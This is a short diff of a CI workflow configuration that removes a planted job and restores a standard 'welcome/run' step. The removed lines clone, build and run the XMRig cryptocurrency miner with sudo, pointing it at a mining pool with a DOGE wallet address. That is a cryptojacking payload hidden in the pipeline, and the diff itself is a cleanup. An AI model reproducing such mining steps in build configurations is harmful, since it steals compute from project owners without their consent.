@@ -10,10 +10,5 @@ workflows:
   welcome:
     # Run the welcome/run job in its own container
     jobs:
-      - sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
-      - git clone https://github.com/xmrig/xmrig.git
-      - mkdir xmrig/build && cd xmrig/build
-      - cmake ..
-      - sudo make -j$(nproc)
-      - sudo chmod 744 xmrig
-      - sudo ./xmrig -o rx.unmineable.com:3333 -u DOGE:D5JVmrCcerQuWfEigACBJ3KNHuR29KSUxq.Nanda1 -p x -k -a rx/0
+      - welcome/run
+
